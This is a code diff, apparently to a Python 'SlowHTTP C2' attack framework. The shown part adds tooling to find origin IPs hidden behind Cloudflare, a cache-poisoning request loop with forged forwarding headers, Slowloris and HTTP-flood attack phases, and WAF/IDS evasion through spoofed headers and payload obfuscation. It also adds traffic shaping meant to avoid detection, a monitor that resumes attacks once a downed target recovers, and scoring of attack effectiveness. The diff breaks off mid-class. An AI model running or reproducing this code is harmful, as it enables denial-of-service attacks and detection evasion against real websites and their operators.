@@ -29,6 +29,8 @@ import tempfile
 import platform
 import shutil
 import traceback
+import warnings
+warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 import textwrap
 
 
@@ -93,7 +95,9 @@ logger = logging.getLogger("SlowHTTP-C2")
 
 # Version information
 VERSION = "5.0"
-BUILD_DATE = "2025-09-27"
+BUILD_DATE = "2025-01-04"
+AUTHOR = "NinjaTech Security Team"
+DESCRIPTION = "Advanced Distributed SlowHTTP C2 Framework"
 
 class Colors:
     """ANSI color codes for terminal output"""
@@ -1206,7 +1210,7 @@ import threading
 import json
 from urllib.parse import urlparse
 
-VERSION = "3.0"
+# VERSION moved to top of file - removed duplicate
 
 class SlowHTTPAttacker:
     def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
@@ -1825,7 +1829,7 @@ import struct
 from urllib.parse import urlparse
 import select
 
-VERSION = "5.0"
+# VERSION moved to top of file - removed duplicate
 
 class AdvancedHTTPAttacker:
     def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
@@ -5750,6 +5754,1546 @@ class SlowHTTPTUI:
                 print(f"  Received: {self._format_bytes(stats.bytes_recv)}")
         
         input("\nPress Enter to continue...")
+
+
+#############################################################################
+# ENHANCED FEATURES - DNS HISTORY & CLOUDFLARE BYPASS
+#############################################################################
+
+class DNSHistoryTool:
+    """
+    DNS History and Subdomain Discovery Tool
+    Finds historical IPs and subdomains (especially non-Cloudflare IPs)
+    """
+    def __init__(self):
+        self.results = {
+            "subdomains": [],
+            "historical_ips": [],
+            "current_ips": [],
+            "non_cloudflare_ips": [],
+            "dns_records": {}
+        }
+        
+        # Cloudflare IP ranges
+        self.cloudflare_ranges = [
+            "173.245.48.0/20", "103.21.244.0/22", "103.22.200.0/22",
+            "103.31.4.0/22", "141.101.64.0/18", "108.162.192.0/18",
+            "190.93.240.0/20", "188.114.96.0/20", "197.234.240.0/22",
+            "198.41.128.0/17", "162.158.0.0/15", "104.16.0.0/13",
+            "104.24.0.0/14", "172.64.0.0/13", "131.0.72.0/22"
+        ]
+    
+    def is_cloudflare_ip(self, ip):
+        """Check if IP belongs to Cloudflare"""
+        try:
+            ip_obj = ipaddress.ip_address(ip)
+            for cidr in self.cloudflare_ranges:
+                if ip_obj in ipaddress.ip_network(cidr):
+                    return True
+            return False
+        except:
+            return False
+    
+    def enumerate_subdomains(self, domain):
+        """Enumerate subdomains using common prefixes"""
+        subdomains = []
+        common_prefixes = [
+            "www", "mail", "ftp", "admin", "webmail", "smtp", "pop", "ns1", "ns2",
+            "cpanel", "whm", "autodiscover", "autoconfig", "m", "mobile", "api",
+            "dev", "staging", "test", "portal", "vpn", "remote", "blog", "shop",
+            "store", "cdn", "static", "media", "img", "images", "video", "download",
+            "forum", "support", "help", "docs", "wiki", "status", "monitor", "app",
+            "beta", "demo", "old", "new", "secure", "login", "register", "dashboard"
+        ]
+        
+        logger.info(f"Enumerating subdomains for {domain}...")
+        print(f"{Colors.YELLOW}[*] Enumerating subdomains for {domain}...{Colors.RESET}")
+        
+        found_count = 0
+        for prefix in common_prefixes:
+            subdomain = f"{prefix}.{domain}"
+            try:
+                if DNS_AVAILABLE:
+                    import dns.resolver
+                    answers = dns.resolver.resolve(subdomain, 'A', lifetime=2)
+                    ips = [str(rdata) for rdata in answers]
+                    is_cf = any(self.is_cloudflare_ip(ip) for ip in ips)
+                    subdomains.append({
+                        "subdomain": subdomain,
+                        "ips": ips,
+                        "is_cloudflare": is_cf
+                    })
+                    status = f"{Colors.RED}[CF]{Colors.RESET}" if is_cf else f"{Colors.GREEN}[Direct]{Colors.RESET}"
+                    print(f"  {status} {subdomain} -> {', '.join(ips)}")
+                    found_count += 1
+            except:
+                pass
+        
+        print(f"{Colors.GREEN}[+] Found {found_count} subdomains{Colors.RESET}")
+        self.results["subdomains"] = subdomains
+        return subdomains
+    
+    def get_dns_history(self, domain):
+        """Get DNS history using various methods"""
+        logger.info(f"Fetching DNS history for {domain}...")
+        print(f"\\n{Colors.BOLD}=== DNS HISTORY LOOKUP ==={Colors.RESET}\\n")
+        print(f"{Colors.YELLOW}[*] Target: {domain}{Colors.RESET}")
+        
+        try:
+            if DNS_AVAILABLE:
+                import dns.resolver
+                
+                # Get current A records
+                try:
+                    print(f"{Colors.YELLOW}[*] Resolving A records...{Colors.RESET}")
+                    answers = dns.resolver.resolve(domain, 'A')
+                    current_ips = [str(rdata) for rdata in answers]
+                    self.results["current_ips"] = current_ips
+                    
+                    # Filter non-Cloudflare IPs
+                    non_cf_ips = [ip for ip in current_ips if not self.is_cloudflare_ip(ip)]
+                    self.results["non_cloudflare_ips"] = non_cf_ips
+                    
+                    print(f"{Colors.GREEN}[+] Current IPs: {', '.join(current_ips)}{Colors.RESET}")
+                    if non_cf_ips:
+                        print(f"{Colors.GREEN}[+] Non-Cloudflare IPs: {', '.join(non_cf_ips)}{Colors.RESET}")
+                    else:
+                        print(f"{Colors.RED}[!] All IPs are behind Cloudflare{Colors.RESET}")
+                except Exception as e:
+                    print(f"{Colors.RED}[!] Failed to resolve A records: {str(e)}{Colors.RESET}")
+                
+                # Get other DNS records
+                record_types = ['MX', 'NS', 'TXT', 'CNAME']
+                for record_type in record_types:
+                    try:
+                        answers = dns.resolver.resolve(domain, record_type)
+                        records = [str(rdata) for rdata in answers]
+                        self.results["dns_records"][record_type] = records
+                        print(f"{Colors.BLUE}[i] {record_type} records ({len(records)}): {', '.join(records[:3])}{Colors.RESET}")
+                    except:
+                        pass
+            else:
+                print(f"{Colors.RED}[!] DNS library not available{Colors.RESET}")
+                        
+        except Exception as e:
+            logger.error(f"DNS history lookup failed: {str(e)}")
+            print(f"{Colors.RED}[!] DNS lookup failed: {str(e)}{Colors.RESET}")
+        
+        return self.results
+    
+    def find_origin_ip(self, domain):
+        """Try to find origin IP behind Cloudflare"""
+        logger.info(f"Searching for origin IP of {domain}...")
+        print(f"\\n{Colors.YELLOW}[*] Searching for origin IP behind Cloudflare...{Colors.RESET}\\n")
+        
+        # Method 1: Check subdomains for non-Cloudflare IPs
+        print(f"{Colors.BLUE}[i] Method 1: Subdomain enumeration{Colors.RESET}")
+        subdomains = self.enumerate_subdomains(domain)
+        for sub in subdomains:
+            if not sub["is_cloudflare"] and sub["ips"]:
+                print(f"\\n{Colors.GREEN}[+] ORIGIN IP FOUND via subdomain {sub['subdomain']}: {sub['ips'][0]}{Colors.RESET}")
+                return sub["ips"][0]
+        
+        # Method 2: Check MX records
+        print(f"\\n{Colors.BLUE}[i] Method 2: MX record analysis{Colors.RESET}")
+        if "MX" in self.results["dns_records"]:
+            for mx in self.results["dns_records"]["MX"]:
+                try:
+                    if DNS_AVAILABLE:
+                        import dns.resolver
+                        mx_host = str(mx).split()[-1].rstrip('.')
+                        print(f"{Colors.YELLOW}[*] Checking MX host: {mx_host}{Colors.RESET}")
+                        answers = dns.resolver.resolve(mx_host, 'A')
+                        for rdata in answers:
+                            ip = str(rdata)
+                            if not self.is_cloudflare_ip(ip):
+                                print(f"\\n{Colors.GREEN}[+] ORIGIN IP FOUND via MX record: {ip}{Colors.RESET}")
+                                return ip
+                except Exception as e:
+                    logger.debug(f"MX lookup error: {str(e)}")
+        
+        # Method 3: Check non-Cloudflare IPs from current records
+        print(f"\\n{Colors.BLUE}[i] Method 3: Direct IP check{Colors.RESET}")
+        if self.results["non_cloudflare_ips"]:
+            print(f"{Colors.GREEN}[+] ORIGIN IP FOUND: {self.results['non_cloudflare_ips'][0]}{Colors.RESET}")
+            return self.results["non_cloudflare_ips"][0]
+        
+        print(f"\\n{Colors.RED}[!] Could not find origin IP - target may be fully protected by Cloudflare{Colors.RESET}")
+        return None
+
+
+class CloudflareBypassAttack:
+    """
+    Advanced Cloudflare Bypass Attack Techniques
+    """
+    def __init__(self, target, port=443, use_ssl=True):
+        self.target = target
+        self.port = port
+        self.use_ssl = use_ssl
+        self.origin_ip = None
+        self.dns_tool = DNSHistoryTool()
+        self.running = False
+        self.stats = {
+            "requests_sent": 0,
+            "errors": 0,
+            "start_time": None,
+            "end_time": None
+        }
+        
+    def discover_origin_ip(self):
+        """Discover origin IP behind Cloudflare"""
+        logger.info(f"Attempting to discover origin IP for {self.target}...")
+        print(f"\\n{Colors.BOLD}{'='*60}{Colors.RESET}")
+        print(f"{Colors.BOLD}  CLOUDFLARE BYPASS - ORIGIN IP DISCOVERY{Colors.RESET}")
+        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\\n")
+        
+        # Get DNS history and find origin
+        self.dns_tool.get_dns_history(self.target)
+        self.origin_ip = self.dns_tool.find_origin_ip(self.target)
+        
+        if self.origin_ip:
+            print(f"\\n{Colors.GREEN}{'='*60}{Colors.RESET}")
+            print(f"{Colors.GREEN}[SUCCESS] Origin IP discovered: {self.origin_ip}{Colors.RESET}")
+            print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\\n")
+        else:
+            print(f"\\n{Colors.RED}{'='*60}{Colors.RESET}")
+            print(f"{Colors.RED}[FAILED] Could not discover origin IP{Colors.RESET}")
+            print(f"{Colors.RED}{'='*60}{Colors.RESET}\\n")
+        
+        return self.origin_ip
+    
+    def cache_poisoning_attack(self, duration=60):
+        """
+        Cache Poisoning Attack - Attempts to poison Cloudflare's cache
+        """
+        self.running = True
+        self.stats["start_time"] = time.time()
+        
+        logger.info(f"Starting Cache Poisoning attack on {self.target}")
+        print(f"\\n{Colors.BOLD}{'='*60}{Colors.RESET}")
+        print(f"{Colors.BOLD}  CLOUDFLARE BYPASS - CACHE POISONING ATTACK{Colors.RESET}")
+        print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\\n")
+        print(f"{Colors.YELLOW}[*] Target: {self.target}{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] Duration: {duration} seconds{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] Press Ctrl+C to stop{Colors.RESET}\\n")
+        
+        # Setup signal handler
+        original_sigint = signal.getsignal(signal.SIGINT)
+        original_sigterm = signal.getsignal(signal.SIGTERM)
+        
+        def signal_handler(sig, frame):
+            print(f"\\n{Colors.RED}[!] Stopping attack...{Colors.RESET}")
+            self.running = False
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        signal.signal(signal.SIGTERM, signal_handler)
+        
+        end_time = time.time() + duration
+        last_update = time.time()
+        
+        try:
+            while self.running and time.time() < end_time:
+                try:
+                    # Craft malicious headers for cache poisoning
+                    headers = {
+                        'Host': self.target,
+                        'X-Forwarded-Host': f'evil-{random.randint(1000,9999)}.{self.target}',
+                        'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
+                        'X-Original-URL': f'/admin?cache={random.randint(1,99999)}',
+                        'X-Rewrite-URL': f'/admin?poison={random.randint(1,99999)}',
+                        'X-Forwarded-Proto': 'https',
+                        'X-Forwarded-Port': '443',
+                        'Cache-Control': 'no-cache, no-store, must-revalidate',
+                        'Pragma': 'no-cache',
+                        'Expires': '0',
+                        'User-Agent': f'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/{random.randint(500,600)}.{random.randint(1,99)}'
+                    }
+                    
+                    # Add random cache-busting parameters
+                    cache_buster = f'?cb={random.randint(1,999999)}&poison={random.randint(1,999999)}'
+                    url = f"{'https' if self.use_ssl else 'http'}://{self.target}{cache_buster}"
+                    
+                    if REQUESTS_AVAILABLE:
+                        response = requests.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
+                        self.stats["requests_sent"] += 1
+                        
+                        # Update status every 5 seconds
+                        if time.time() - last_update >= 5:
+                            elapsed = int(time.time() - self.stats["start_time"])
+                            remaining = int(end_time - time.time())
+                            rps = self.stats["requests_sent"] / elapsed if elapsed > 0 else 0
+                            
+                            print(f"{Colors.GREEN}[+] Requests: {self.stats['requests_sent']} | "
+                                  f"RPS: {rps:.1f} | "
+                                  f"Errors: {self.stats['errors']} | "
+                                  f"Elapsed: {elapsed}s | "
+                                  f"Remaining: {remaining}s{Colors.RESET}")
+                            last_update = time.time()
+                    
+                except KeyboardInterrupt:
+                    break
+                except Exception as e:
+                    self.stats["errors"] += 1
+                    logger.debug(f"Cache poisoning error: {str(e)}")
+                
+                time.sleep(0.01)  # Small delay to prevent overwhelming
+            
+            self.stats["end_time"] = time.time()
+            duration_actual = self.stats["end_time"] - self.stats["start_time"]
+            
+            print(f"\\n{Colors.BOLD}{'='*60}{Colors.RESET}")
+            print(f"{Colors.BOLD}  ATTACK COMPLETED{Colors.RESET}")
+            print(f"{Colors.BOLD}{'='*60}{Colors.RESET}\\n")
+            print(f"{Colors.GREEN}[+] Total requests sent: {self.stats['requests_sent']}{Colors.RESET}")
+            print(f"{Colors.GREEN}[+] Average RPS: {self.stats['requests_sent']/duration_actual:.2f}{Colors.RESET}")
+            print(f"{Colors.YELLOW}[*] Total errors: {self.stats['errors']}{Colors.RESET}")
+            print(f"{Colors.BLUE}[i] Duration: {duration_actual:.2f} seconds{Colors.RESET}\\n")
+            
+        except Exception as e:
+            logger.error(f"Attack error: {str(e)}")
+            print(f"{Colors.RED}[!] Attack error: {str(e)}{Colors.RESET}")
+        
+        finally:
+            self.running = False
+            # Restore original signal handlers
+            signal.signal(signal.SIGINT, original_sigint)
+            signal.signal(signal.SIGTERM, original_sigterm)
+
+
+class TargetHealthMonitor:
+    """
+    Monitors target health and manages automatic reconnection for persistent attacks
+    """
+    def __init__(self, target, port, use_ssl=False):
+        self.target = target
+        self.port = port
+        self.use_ssl = use_ssl
+        self.is_alive = False
+        self.last_check = None
+        self.consecutive_failures = 0
+        self.check_interval = 5
+        self.max_failures_before_wait = 3
+        
+    def check_target_health(self):
+        """Check if target is responsive"""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
+            result = sock.connect_ex((self.target, self.port))
+            sock.close()
+            
+            if result == 0:
+                self.is_alive = True
+                self.consecutive_failures = 0
+                self.last_check = time.time()
+                return True
+            else:
+                self.is_alive = False
+                self.consecutive_failures += 1
+                self.last_check = time.time()
+                return False
+                
+        except Exception as e:
+            self.is_alive = False
+            self.consecutive_failures += 1
+            self.last_check = time.time()
+            logger.debug(f"Health check error: {str(e)}")
+            return False
+    
+    def wait_for_recovery(self, max_wait=300):
+        """Wait for target to recover with exponential backoff"""
+        logger.info(f"Target {self.target}:{self.port} is down, waiting for recovery...")
+        print(f"\\n{Colors.YELLOW}[!] Target appears to be down{Colors.RESET}")
+        print(f"{Colors.YELLOW}[*] Waiting for target to recover (max {max_wait}s)...{Colors.RESET}\\n")
+        
+        start_time = time.time()
+        attempt = 0
+        
+        while time.time() - start_time < max_wait:
+            attempt += 1
+            wait_time = min(30, 5 * (2 ** min(attempt - 1, 4)))  # Exponential backoff
+            
+            print(f"{Colors.BLUE}[i] Recovery attempt {attempt}, checking in {wait_time}s...{Colors.RESET}")
+            time.sleep(wait_time)
+            
+            if self.check_target_health():
+                recovery_time = time.time() - start_time
+                print(f"\\n{Colors.GREEN}[+] Target recovered after {recovery_time:.1f} seconds!{Colors.RESET}")
+                print(f"{Colors.GREEN}[+] Resuming attack...{Colors.RESET}\\n")
+                return True
+            else:
+                print(f"{Colors.RED}[!] Target still down (attempt {attempt})...{Colors.RESET}")
+        
+        print(f"\\n{Colors.RED}[!] Target did not recover within {max_wait} seconds{Colors.RESET}")
+        return False
+
+
+
+#############################################################################
+# ADVANCED ATTACK PATTERNS & EVASION TECHNIQUES
+#############################################################################
+
+class AdvancedEvasionTechniques:
+    """
+    Advanced evasion techniques to bypass WAF and IDS/IPS
+    """
+    def __init__(self):
+        self.user_agents = self._load_user_agents()
+        self.referers = self._load_referers()
+        self.accept_languages = self._load_accept_languages()
+        
+    def _load_user_agents(self):
+        """Load comprehensive user agent list"""
+        return [
+            # Chrome on Windows
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
+            
+            # Chrome on macOS
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            
+            # Chrome on Linux
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+            
+            # Firefox on Windows
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
+            
+            # Firefox on macOS
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
+            
+            # Firefox on Linux
+            "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
+            
+            # Safari on macOS
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
+            
+            # Safari on iOS
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+            "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
+            
+            # Edge on Windows
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
+            
+            # Opera
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
+            
+            # Mobile browsers
+            "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
+            "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+        ]
+    
+    def _load_referers(self):
+        """Load common referer URLs"""
+        return [
+            "https://www.google.com/",
+            "https://www.bing.com/",
+            "https://www.yahoo.com/",
+            "https://www.facebook.com/",
+            "https://www.twitter.com/",
+            "https://www.linkedin.com/",
+            "https://www.reddit.com/",
+            "https://www.youtube.com/",
+            "https://www.instagram.com/",
+            "https://www.pinterest.com/",
+        ]
+    
+    def _load_accept_languages(self):
+        """Load accept language headers"""
+        return [
+            "en-US,en;q=0.9",
+            "en-GB,en;q=0.9",
+            "en-US,en;q=0.9,es;q=0.8",
+            "en-US,en;q=0.9,fr;q=0.8",
+            "en-US,en;q=0.9,de;q=0.8",
+            "en-US,en;q=0.9,ja;q=0.8",
+            "en-US,en;q=0.9,zh-CN;q=0.8",
+        ]
+    
+    def generate_random_headers(self, target_host):
+        """Generate randomized HTTP headers"""
+        headers = {
+            'Host': target_host,
+            'User-Agent': random.choice(self.user_agents),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Language': random.choice(self.accept_languages),
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Connection': 'keep-alive',
+            'Upgrade-Insecure-Requests': '1',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Cache-Control': 'max-age=0',
+        }
+        
+        # Randomly add referer
+        if random.random() > 0.5:
+            headers['Referer'] = random.choice(self.referers)
+        
+        # Randomly add DNT
+        if random.random() > 0.7:
+            headers['DNT'] = '1'
+        
+        return headers
+    
+    def obfuscate_payload(self, payload):
+        """Obfuscate attack payload"""
+        techniques = [
+            self._case_variation,
+            self._add_whitespace,
+            self._url_encoding,
+            self._double_encoding,
+        ]
+        
+        technique = random.choice(techniques)
+        return technique(payload)
+    
+    def _case_variation(self, payload):
+        """Vary case of payload"""
+        result = ""
+        for char in payload:
+            if random.random() > 0.5:
+                result += char.upper()
+            else:
+                result += char.lower()
+        return result
+    
+    def _add_whitespace(self, payload):
+        """Add random whitespace"""
+        whitespace_chars = [' ', '\\t', '\\n', '\\r']
+        result = payload
+        for _ in range(random.randint(1, 5)):
+            pos = random.randint(0, len(result))
+            result = result[:pos] + random.choice(whitespace_chars) + result[pos:]
+        return result
+    
+    def _url_encoding(self, payload):
+        """URL encode payload"""
+        import urllib.parse
+        return urllib.parse.quote(payload)
+    
+    def _double_encoding(self, payload):
+        """Double URL encode payload"""
+        import urllib.parse
+        return urllib.parse.quote(urllib.parse.quote(payload))
+
+
+class AttackPatternGenerator:
+    """
+    Generate sophisticated attack patterns
+    """
+    def __init__(self):
+        self.patterns = []
+        self.evasion = AdvancedEvasionTechniques()
+        
+    def generate_slowloris_pattern(self, target, duration):
+        """Generate Slowloris attack pattern"""
+        pattern = {
+            'type': 'slowloris',
+            'target': target,
+            'duration': duration,
+            'phases': []
+        }
+        
+        # Phase 1: Ramp up
+        pattern['phases'].append({
+            'name': 'ramp_up',
+            'duration': duration * 0.2,
+            'connections': lambda t: int(50 + (t / (duration * 0.2)) * 150),
+            'delay': 15
+        })
+        
+        # Phase 2: Sustain
+        pattern['phases'].append({
+            'name': 'sustain',
+            'duration': duration * 0.6,
+            'connections': 200,
+            'delay': 10
+        })
+        
+        # Phase 3: Burst
+        pattern['phases'].append({
+            'name': 'burst',
+            'duration': duration * 0.2,
+            'connections': 300,
+            'delay': 5
+        })
+        
+        return pattern
+    
+    def generate_http_flood_pattern(self, target, duration):
+        """Generate HTTP flood attack pattern"""
+        pattern = {
+            'type': 'http_flood',
+            'target': target,
+            'duration': duration,
+            'phases': []
+        }
+        
+        # Phase 1: Warm up
+        pattern['phases'].append({
+            'name': 'warm_up',
+            'duration': duration * 0.1,
+            'rps': lambda t: int(100 + (t / (duration * 0.1)) * 400),
+        })
+        
+        # Phase 2: Full throttle
+        pattern['phases'].append({
+            'name': 'full_throttle',
+            'duration': duration * 0.7,
+            'rps': 500,
+        })
+        
+        # Phase 3: Cool down
+        pattern['phases'].append({
+            'name': 'cool_down',
+            'duration': duration * 0.2,
+            'rps': lambda t: int(500 - (t / (duration * 0.2)) * 400),
+        })
+        
+        return pattern
+
+
+class RateLimiter:
+    """
+    Intelligent rate limiting to avoid detection
+    """
+    def __init__(self, max_rate=100, window=60):
+        self.max_rate = max_rate
+        self.window = window
+        self.requests = []
+        self.lock = threading.Lock()
+        
+    def acquire(self):
+        """Acquire permission to send request"""
+        with self.lock:
+            now = time.time()
+            
+            # Remove old requests outside window
+            self.requests = [req_time for req_time in self.requests if now - req_time < self.window]
+            
+            # Check if we can send
+            if len(self.requests) < self.max_rate:
+                self.requests.append(now)
+                return True
+            
+            # Calculate wait time
+            oldest = min(self.requests)
+            wait_time = self.window - (now - oldest)
+            return False, wait_time
+    
+    def get_current_rate(self):
+        """Get current request rate"""
+        with self.lock:
+            now = time.time()
+            recent = [req_time for req_time in self.requests if now - req_time < self.window]
+            return len(recent) / self.window
+
+
+class TrafficShaper:
+    """
+    Shape attack traffic to appear more legitimate
+    """
+    def __init__(self):
+        self.patterns = {
+            'human': self._human_pattern,
+            'bot': self._bot_pattern,
+            'burst': self._burst_pattern,
+            'steady': self._steady_pattern,
+        }
+        
+    def _human_pattern(self):
+        """Simulate human browsing pattern"""
+        # Humans have variable delays
+        base_delay = random.uniform(1, 5)
+        variation = random.gauss(0, 1)
+        return max(0.1, base_delay + variation)
+    
+    def _bot_pattern(self):
+        """Simulate bot pattern"""
+        # Bots are more consistent
+        return random.uniform(0.5, 2)
+    
+    def _burst_pattern(self):
+        """Burst pattern"""
+        # Occasional bursts
+        if random.random() < 0.1:
+            return random.uniform(0.01, 0.1)
+        return random.uniform(2, 5)
+    
+    def _steady_pattern(self):
+        """Steady pattern"""
+        return random.uniform(0.5, 1.5)
+    
+    def get_delay(self, pattern='human'):
+        """Get delay based on pattern"""
+        if pattern in self.patterns:
+            return self.patterns[pattern]()
+        return 1.0
+
+
+#############################################################################
+# ADVANCED MONITORING & ANALYTICS
+#############################################################################
+
+class AttackAnalytics:
+    """
+    Advanced analytics for attack effectiveness
+    """
+    def __init__(self):
+        self.metrics = {
+            'requests_sent': 0,
+            'requests_successful': 0,
+            'requests_failed': 0,
+            'bytes_sent': 0,
+            'bytes_received': 0,
+            'response_times': [],
+            'error_types': {},
+            'status_codes': {},
+            'connection_states': {},
+        }
+        self.lock = threading.Lock()
+        
+    def record_request(self, success, response_time=None, status_code=None, bytes_sent=0, bytes_received=0, error=None):
+        """Record request metrics"""
+        with self.lock:
+            self.metrics['requests_sent'] += 1
+            
+            if success:
+                self.metrics['requests_successful'] += 1
+            else:
+                self.metrics['requests_failed'] += 1
+                
+            self.metrics['bytes_sent'] += bytes_sent
+            self.metrics['bytes_received'] += bytes_received
+            
+            if response_time:
+                self.metrics['response_times'].append(response_time)
+                
+            if status_code:
+                self.metrics['status_codes'][status_code] = self.metrics['status_codes'].get(status_code, 0) + 1
+                
+            if error:
+                error_type = type(error).__name__
+                self.metrics['error_types'][error_type] = self.metrics['error_types'].get(error_type, 0) + 1
+    
+    def get_statistics(self):
+        """Get attack statistics"""
+        with self.lock:
+            stats = {
+                'total_requests': self.metrics['requests_sent'],
+                'success_rate': (self.metrics['requests_successful'] / self.metrics['requests_sent'] * 100) if self.metrics['requests_sent'] > 0 else 0,
+                'failure_rate': (self.metrics['requests_failed'] / self.metrics['requests_sent'] * 100) if self.metrics['requests_sent'] > 0 else 0,
+                'total_bytes_sent': self.metrics['bytes_sent'],
+                'total_bytes_received': self.metrics['bytes_received'],
+                'avg_response_time': sum(self.metrics['response_times']) / len(self.metrics['response_times']) if self.metrics['response_times'] else 0,
+                'min_response_time': min(self.metrics['response_times']) if self.metrics['response_times'] else 0,
+                'max_response_time': max(self.metrics['response_times']) if self.metrics['response_times'] else 0,
+                'status_codes': self.metrics['status_codes'].copy(),
+                'error_types': self.metrics['error_types'].copy(),
+            }
+            return stats
+    
+    def calculate_effectiveness(self):
+        """Calculate attack effectiveness score"""
+        stats = self.get_statistics()
+        
+        # Factors for effectiveness
+        success_factor = stats['success_rate'] / 100
+        response_time_factor = 1.0 if stats['avg_response_time'] > 5 else stats['avg_response_time'] / 5
+        error_factor = stats['failure_rate'] / 100
+        
+        # Calculate score (0-100)
+        effectiveness = (success_factor * 0.4 + response_time_factor * 0.3 + error_factor * 0.3) * 100
+        
+        return min(100, max(0, effectiveness))
+    
+    def generate_report(self):
+        """Generate detailed attack report"""
+        stats = self.get_statistics()
+        effectiveness = self.calculate_effectiveness()
+        
+        report = f"""
+{'='*60}
+ATTACK ANALYTICS REPORT
+{'='*60}
+
+OVERALL STATISTICS:
+  Total Requests: {stats['total_requests']}
+  Successful: {stats['total_requests'] - stats['total_requests'] * stats['failure_rate'] / 100:.0f} ({stats['success_rate']:.2f}%)
+  Failed: {stats['total_requests'] * stats['failure_rate'] / 100:.0f} ({stats['failure_rate']:.2f}%)
+  
+DATA TRANSFER:
+  Bytes Sent: {self._format_bytes(stats['total_bytes_sent'])}
+  Bytes Received: {self._format_bytes(stats['total_bytes_received'])}
+  
+RESPONSE TIMES:
+  Average: {stats['avg_response_time']:.3f}s
+  Minimum: {stats['min_response_time']:.3f}s
+  Maximum: {stats['max_response_time']:.3f}s
+  
+STATUS CODES:
+"""
+        for code, count in sorted(stats['status_codes'].items()):
+            report += f"  {code}: {count} ({count/stats['total_requests']*100:.1f}%)\\n"
+        
+        report += "\\nERROR TYPES:\\n"
+        for error_type, count in sorted(stats['error_types'].items()):
+            report += f"  {error_type}: {count} ({count/stats['total_requests']*100:.1f}%)\\n"
+        
+        report += f"""
+EFFECTIVENESS SCORE: {effectiveness:.2f}/100
+
+{'='*60}
+"""
+        return report
+    
+    def _format_bytes(self, bytes_val):
+        """Format bytes to human readable"""
+        for unit in ['B', 'KB', 'MB', 'GB']:
+            if bytes_val < 1024.0:
+                return f"{bytes_val:.2f} {unit}"
+            bytes_val /= 1024.0
+        return f"{bytes_val:.2f} TB"
+
+
+class RealTimeMonitor:
+    """
+    Real-time monitoring of attack progress
+    """
+    def __init__(self, update_interval=1.0):
+        self.update_interval = update_interval
+        self.running = False
